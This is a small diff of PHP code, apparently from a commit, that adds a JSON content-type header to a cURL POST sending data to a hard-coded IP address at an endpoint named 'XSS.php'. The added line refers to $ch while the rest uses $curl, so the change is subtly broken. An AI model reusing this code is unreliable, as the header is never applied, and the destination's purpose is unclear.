@@ -26,6 +26,7 @@
 			curl_setopt($curl, CURLOPT_URL, "20.200.213.238:3737/XSS.php");
 			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 			curl_setopt($curl, CURLOPT_POST, 1);
+			curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
 			curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
 			$json = curl_exec($curl);
